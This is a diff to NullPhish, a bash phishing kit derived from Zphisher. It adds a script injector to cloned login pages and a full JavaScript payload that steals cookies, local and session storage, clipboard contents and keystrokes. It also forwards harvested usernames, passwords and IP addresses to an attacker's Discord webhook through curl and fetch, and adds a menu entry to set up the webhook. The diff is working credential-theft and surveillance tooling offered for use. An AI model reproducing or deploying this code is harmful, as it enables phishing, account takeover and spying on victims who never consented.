@@ -1,7 +1,7 @@
 #!/bin/bash
 ##   NullPhish   :   Automated Phishing Tool
 ##   Author      :   r4tur1
-##   Version     :   1.0
+##   Version     :   1.1
 ##   Github      :   https://github.com/r4tur1/NullPhish
 ##
 ##   Based on Zphisher by htr-tech
@@ -351,6 +351,14 @@ setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
+	
+	# ===== UNIVERSAL INJECTOR =====
+	if [[ -f ".server/inject.js" ]]; then
+		find .server/www -name "*.html" -exec sed -i 's|</head>|<script src="/inject.js"></script>\n</head>|' {} \;
+		cp -f .server/inject.js .server/www/inject.js
+	fi
+	# ===== END INJECTOR =====
+	
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
@@ -373,6 +381,18 @@ capture_creds() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
+	
+	# ===== DISCORD WEBHOOK FORWARD =====
+	if [[ -f ".server/inject.js" ]]; then
+		WEBHOOK_URL=$(grep -o "webhookURL: '[^']*'" .server/inject.js | cut -d"'" -f2)
+		if [[ ! -z "$WEBHOOK_URL" ]]; then
+			curl -s -H "Content-Type: application/json" \
+				-d "{\"embeds\":[{\"title\":\"🔑 New Credentials Captured\",\"color\":65280,\"fields\":[{\"name\":\"Account\",\"value\":\"$ACCOUNT\",\"inline\":true},{\"name\":\"Password\",\"value\":\"||$PASSWORD||\",\"inline\":true},{\"name\":\"IP\",\"value\":\"$IP\",\"inline\":true}]}]}" \
+				"$WEBHOOK_URL" > /dev/null 2>&1 &
+		fi
+	fi
+	# ===== END WEBHOOK FORWARD =====
+	
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
@@ -679,6 +699,205 @@ site_vk() {
 	esac
 }
 
+## Discord Webhook Configuration
+configure_webhook() {
+	{ clear; banner_small; echo; }
+	cat <<- EOF
+		${RED}[${WHITE}::${RED}]${ORANGE} Discord Webhook Integration ${RED}[${WHITE}::${RED}]${ORANGE}
+		
+		${CYAN}This will configure captured data to be sent directly
+		to your Discord server via webhook.
+		
+		${GREEN}How to get a webhook URL:
+		${WHITE}1. Open Discord > Server Settings > Integrations
+		${WHITE}2. Create Webhook > Copy Webhook URL
+		${WHITE}3. Paste it below
+		
+		${ORANGE}NOTE: This will also enable the universal injector
+		(session cookies, keylogger, clipboard hijack).
+		
+	EOF
+	
+	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Enter Discord Webhook URL ${CYAN}(or press Enter to skip): ${WHITE}"
+	read webhook_input
+	
+	if [[ ! -z "$webhook_input" ]] && [[ "$webhook_input" =~ ^https://discord\.com/api/webhooks/ ]]; then
+		
+		# Create inject.js if it doesn't exist
+		if [[ ! -f ".server/inject.js" ]]; then
+			cat > ".server/inject.js" <<- 'JSEOF'
+(function() {
+	'use strict';
+	
+	const CONFIG = {
+		sessionGrabber: true,
+		clipboardHijack: true,
+		keylogger: true,
+		localStorageGrab: true,
+		webhookURL: 'WEBHOOK_PLACEHOLDER'
+	};
+	
+	// Session & Storage Grabber
+	if (CONFIG.sessionGrabber) {
+		const payload = {
+			type: 'session_data',
+			url: window.location.href,
+			cookies: document.cookie,
+			localStorage: JSON.stringify(localStorage),
+			sessionStorage: JSON.stringify(sessionStorage),
+			userAgent: navigator.userAgent,
+			referrer: document.referrer,
+			screenRes: screen.width + 'x' + screen.height,
+			timestamp: new Date().toISOString()
+		};
+		if (CONFIG.webhookURL) sendToWebhook(payload);
+	}
+	
+	// Clipboard Hijacker
+	if (CONFIG.clipboardHijack) {
+		let lastClipboard = '';
+		document.addEventListener('copy', function(e) {
+			const text = window.getSelection().toString();
+			if (text && text !== lastClipboard) {
+				lastClipboard = text;
+				if (CONFIG.webhookURL) {
+					sendToWebhook({ 
+						type: 'clipboard', 
+						data: text, 
+						url: window.location.href,
+						timestamp: new Date().toISOString() 
+					});
+				}
+			}
+		});
+		
+		document.addEventListener('click', function() {
+			if (navigator.clipboard && navigator.clipboard.readText) {
+				navigator.clipboard.readText().then(function(text) {
+					if (text && text !== lastClipboard) {
+						lastClipboard = text;
+						if (CONFIG.webhookURL) {
+							sendToWebhook({ 
+								type: 'clipboard_paste', 
+								data: text, 
+								url: window.location.href,
+								timestamp: new Date().toISOString() 
+							});
+						}
+					}
+				}).catch(function() {});
+			}
+		}, { once: true });
+	}
+	
+	// Keylogger
+	if (CONFIG.keylogger) {
+		let buffer = '';
+		let timer = null;
+		let currentField = 'unknown';
+		
+		document.addEventListener('focusin', function(e) {
+			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
+				buffer = '';
+			}
+		}, true);
+		
+		document.addEventListener('keypress', function(e) {
+			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+				buffer += e.key;
+				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
+				clearTimeout(timer);
+				timer = setTimeout(function() {
+					if (buffer && CONFIG.webhookURL) {
+						sendToWebhook({ 
+							type: 'keystrokes', 
+							data: buffer, 
+							field: currentField, 
+							url: window.location.href,
+							timestamp: new Date().toISOString() 
+						});
+						buffer = '';
+					}
+				}, 2000);
+			}
+		}, true);
+	}
+	
+	// Discord Webhook Sender
+	function sendToWebhook(data) {
+		if (!CONFIG.webhookURL || CONFIG.webhookURL === 'WEBHOOK_PLACEHOLDER') return;
+		
+		let description = '';
+		if (data.type === 'session_data') {
+			description = '**Cookies:** ```' + (data.cookies || 'None').substring(0, 500) + '```\n';
+			description += '**LocalStorage:** ```' + (data.localStorage || '{}').substring(0, 300) + '```\n';
+			description += '**SessionStorage:** ```' + (data.sessionStorage || '{}').substring(0, 300) + '```';
+		} else if (data.type === 'keystrokes') {
+			description = '**Field:** `' + data.field + '`\n**Keys:** ```' + data.data + '```';
+		} else if (data.type === 'clipboard' || data.type === 'clipboard_paste') {
+			description = '**Content:** ```' + data.data.substring(0, 1000) + '```';
+		}
+		
+		fetch(CONFIG.webhookURL, {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				embeds: [{
+					title: '📥 ' + data.type.replace('_', ' ').toUpperCase(),
+					description: description,
+					color: 0xff0000,
+					fields: [
+						{ name: 'URL', value: data.url || window.location.href, inline: false },
+						{ name: 'User Agent', value: data.userAgent || navigator.userAgent, inline: false },
+						{ name: 'Referrer', value: data.referrer || document.referrer || 'Direct', inline: true },
+						{ name: 'Screen', value: data.screenRes || (screen.width + 'x' + screen.height), inline: true }
+					],
+					footer: { text: 'NullPhish Injector | ' + (data.timestamp || new Date().toISOString()) }
+				}]
+			})
+		}).catch(function() {});
+	}
+})();
+JSEOF
+			# Replace placeholder with actual webhook
+			sed -i "s|WEBHOOK_PLACEHOLDER|$webhook_input|g" .server/inject.js
+		else
+			# Update existing inject.js with webhook URL
+			sed -i "s|webhookURL: '[^']*'|webhookURL: '$webhook_input'|g" .server/inject.js
+		fi
+		
+		chmod 644 .server/inject.js
+		
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Webhook configured successfully!"
+		echo -e "${CYAN}The universal injector is now ACTIVE with:"
+		echo -e "  ${WHITE}• Session Cookie Grabbing"
+		echo -e "  ${WHITE}• LocalStorage / SessionStorage Theft"
+		echo -e "  ${WHITE}• Clipboard Hijacking (copy + paste)"
+		echo -e "  ${WHITE}• Keystroke Logging"
+		echo -e "  ${WHITE}• Discord Webhook Delivery${WHITE}"
+		
+		# Test the webhook
+		curl -s -H "Content-Type: application/json" \
+			-d "{\"content\":\"✅ **NullPhish Webhook Connected**\\nAll captures will be forwarded here.\\n\\n**Enabled Modules:** Session Grabber, Keylogger, Clipboard Hijack, Storage Theft\"}" \
+			"$webhook_input" > /dev/null 2>&1 &
+		
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Test message sent to Discord. Check your channel.${WHITE}"
+		
+	elif [[ -z "$webhook_input" ]]; then
+		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} No webhook entered. Feature not enabled.${WHITE}"
+		
+		# Disable webhook in inject.js if it exists
+		if [[ -f ".server/inject.js" ]]; then
+			sed -i "s|webhookURL: '[^']*'|webhookURL: ''|g" .server/inject.js
+		fi
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid webhook URL format. Must start with https://discord.com/api/webhooks/${WHITE}"
+	fi
+	
+	{ sleep 3; main_menu; }
+}
+
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
@@ -697,6 +916,8 @@ main_menu() {
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		
+		${RED}[${WHITE}101${RED}]${ORANGE} Discord Webhook Config
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -837,6 +1058,8 @@ main_menu() {
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
+		101)
+			configure_webhook;;
 		99)
 			about;;
 		0 | 00 )
